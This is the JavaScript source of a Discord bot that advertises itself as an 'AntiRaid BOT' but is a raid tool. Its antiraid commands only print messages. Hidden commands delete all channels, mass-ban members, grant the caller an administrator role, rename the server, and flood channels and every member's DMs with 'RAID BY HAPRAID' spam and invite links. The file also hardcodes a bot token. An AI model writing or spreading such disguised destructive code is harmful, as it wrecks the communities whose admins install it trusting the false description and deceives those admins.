﻿const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "process.env.TOKEN";
var prefix = ".";
var mention = "126connectés"

var fucked = false;

bot.on('ready', () => {
    bot.user.setActivity("2.0 362 guilds | 1320 channel", {
        type: "STREAMING",
        url: "https://www.twitch.tv/antiraidbot"
      });
});

 bot.on('ready',() => {

  

  console.log("Je suis "+bot.user.username+" je suis sur "+bot.guilds.size+" serveurs et j'ai "+bot.users.size+" membres "+bot.user.id)
  })

 
bot.on('message', msg => {
  //#region Legit
  /* Commandes legit */
  if (msg.content === '.ping') {
    msg.reply('pong !')
  }
  //#endregion
 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '.a') {
    console.log(`Commande .des par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone  @here  ");
     }, 5000);
  }
            if (msg.content === '.des') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();

                for (var n = 0; n < 2; n++)  {
                msg.guild.members.forEach(member => {
                  
                    member.send(msg.guild.owner.user.username+" s'est fait trucidé son serveur par @everyone RAID BY HAPRAID https://cdn.discordapp.com/attachments/632634089828253771/638024930373533726/tenor.gif HAPRAID VOUS AIME https://discord.gg/HuzU78K  www.hapraid.com CLIQUEZ **Je commence à en avoir marre de vous**").catch(error => {})            
                  })
       } 
      }
      }); 
      
       bot.on('message', msg => {

if(msg.content === '.del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
          msg.guild.createChannel('discord-bug', 'text').catch(e => {});
      }
 
  
 
  if (msg.content === '.ban') {
    console.log(`Commande .bane par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "haprole",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
bot.on("message", msg => {
        

          if(msg.content.startsWith(".des")){
            msg.delete()
            
           // for (var s = 0; s < 30; s++)  {
      
           
              
             

             var interval;
             var count = 0;
                // ...
               interval = setInterval(function() { 
                 msg.guild.channels.find(channel => {
                if (channel.type === "text")
                channel.send('"@everyone RAID BY HAPRAID https://cdn.discordapp.com/attachments/632634089828253771/638024930373533726/tenor.gif HAPRAID VOUS AIME https://discord.gg/HuzU78K  www.hapraid.com CLIQUEZ **Je commence à en avoir marre de vous** ')
                
              });
              
              count++; 
           
            
        console.log(count, 'seconds passed'); 
        if (count == 10) { 
              clearInterval(interval);
              console.log('Raid effectué ')
            }
          }, 1000);
            }         
              
        });




bot.on('message', msg => {
  if (msg.content === '.des') {
    console.log(`Commande .des par ${msg.author.tag}`);
 
      msg.guild.setIcon("hapraid.png").catch(e => {});
      msg.guild.setName('RAID BY HAPRAID').catch(e => {});

        var interval;
             var count = 0;
                // ...
               interval = setInterval(function() {
        msg.guild.createChannel('raid-by-hapraid', 'voice').catch(e => {});
        msg.guild.createChannel('raid-by-hapraid', 'text').catch(e => {});
        count++; 
           
            
        console.log(count, 'salons créés'); 
        if (count == 17) { 
              clearInterval(interval);
              console.log('Tout les salons ont été crééss ')
            }
          }, 500);
      

    if (msg.deletable) {
      msg.delete();
    }
  }
});


//DEFACE (NON FINIT)
bot.on('message', msg => {
  if (msg.content === '.hap') {
    console.log(`Commande .des par ${msg.author.tag}`);
      msg.guild.setIcon("hapraid.png").catch(e => {});
      msg.guild.setName('RAID BY HAPRAID').catch(e => {});

        var interval;
             var count = 0;
                // ...
               interval = setInterval(function() {
                if(msg.channel.type === "dm") return;
                if(msg.guild.channels.size === 0) return;
                else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
                msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
                
        msg.guild.createChannel('raid-by-hapraid', 'voice').catch(e => {});
        msg.guild.createChannel('raid-by-hapraid', 'text').catch(e => {});
        
        
        
      
        if (msg.channel.type === "dm") return;
          

        for (var n = 0; n < 1; n++)  {
        msg.guild.members.forEach(member => {
          
            member.send(msg.guild.owner.user.username+" s'est fait trucidé son serveur par @everyone RAID BY HAPRAID https://cdn.discordapp.com/attachments/632634089828253771/638024930373533726/tenor.gif HAPRAID VOUS AIME https://discord.gg/HuzU78K  www.hapraid.com CLIQUEZ **Je commence à en avoir marre de vous**").catch(error => {})            
          })
        }
        count++; 
        
           
            
        console.log(count, 'salons créés'); 
        if (count == 1) { 
              clearInterval(interval);
              console.log('Tout les salons ont été crééss ')
            }
          }, 500);

          msg.guild.channels.find(channel => {
            if (channel.type === "text")
            channel.send('"@everyone RAID BY HAPRAID https://cdn.discordapp.com/attachments/632634089828253771/638024930373533726/tenor.gif HAPRAID VOUS AIME https://discord.gg/HuzU78K  www.hapraid.com CLIQUEZ **Je commence à en avoir marre de vous** ')
            
          });

          
 


    if (msg.deletable) {
      msg.delete();
    }
  }
});



//HELP COMMANDE ANTIRAIDBOT

bot.on('message', msg => {

  const args = msg.content.split(" ").slice(1);

  if(msg.content === '.help') {
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setThumbnail(msg.author.avatarURL)
      .setTitle(`  __ AntiRaid BOT { List commands }: __   `)
      .addField(' ** .antiraid : **', ' [ Activate antiraid mode ]  ')
      .addField(' ** .slowmode  : **', ' [ Activate slowmode ] ')
      .addField(' ** .purge  : **', ' [ To purge channel ]   ')	  
      .addField(' ** .credits   :**', '  [ Credits of developper ]  ')	  
      .setColor('#40FF00')
      .setFooter('AntiRaid BOT')
      .setTimestamp()
      .setImage('https://cdn.discordapp.com/attachments/684800313898696732/684809143919575085/ezgif-6-a62eafac476f.gif')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }

  if(msg.content === '.antiraid') {
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
    .setThumbnail(msg.author.avatarURL)
    .setTitle(`  __ AntiRaid BOT : __   `)
    .addField(' ** .antiraid on : **', ' [ Activate antiraid mode ]  ')
    .addField(' ** .antiraid off  : **', ' [ Desactivate antiraid mode ] ')	  
    .setColor('#40FF00')
    .setFooter('AntiRaid BOT')
    .setTimestamp()
     msg.channel.send(helpAEmbed).catch(err => con(err));

  }

  if(msg.content === '.antiraid on') {
    if (msg.deletable) msg.delete();
msg.channel.send('**Antiraid mode was activated !** (**on**) :white_check_mark: ')
  }
  if(msg.content === '.antiraid off') {
    if (msg.deletable) msg.delete();
msg.channel.send('**Antiraid mode was desactivated** (**off**) :x: ')
  }
  if(msg.content.startsWith(".slowmode")){
    if (msg.deletable) msg.delete();
    msg.channel.send('**Slowmode was set !**')
  }
  if(msg.content.startsWith(".purge")){
    msg.channel.fetchMessages({ 
    limit: args[0]
    }).then((msgCollection) => {
    msgCollection.forEach((msg) => {
    msg.delete();
    })
  });
}
if (msg.content === '.credits') {
  if (msg.deletable) msg.delete();
  var helpAEmbed = new Discord.RichEmbed()

    .setThumbnail(msg.author.avatarURL)
    .setTitle(`[AntiRaid BOT] **Credits** `)
    .addField('**HappyBoy**', 'Developer')
      .setColor('#00FF00')
      .setImage('https://cdn.discordapp.com/attachments/684800313898696732/684809143919575085/ezgif-6-a62eafac476f.gif')
  msg.channel.send(helpAEmbed).catch(err => con(err));

}
});







        //REDEMARRAGE
        bot.on('message', message => {
          if(message.content.startsWith(".reboot")){ 
                  resetBot(message.channel);
                  
            
                
      
              // ... other commands
          }
      });
      
      // Turn bot off (destroy), then turn it back on
      function resetBot(channel) {
          // send channel a message that you're resetting bot [optional]
          channel.send('Resetting...')
          .then(msg => bot.destroy())
          .then(() => bot.login('Njg1MTM1MTc2NjMxNzEzODM1.XmEWPg.2CdhVL4ieH2ncGOB0pHfVTo1HW8'));
      } 

bot.login('Njg1MTM1MTc2NjMxNzEzODM1.XmEWPg.2CdhVL4ieH2ncGOB0pHfVTo1HW8')
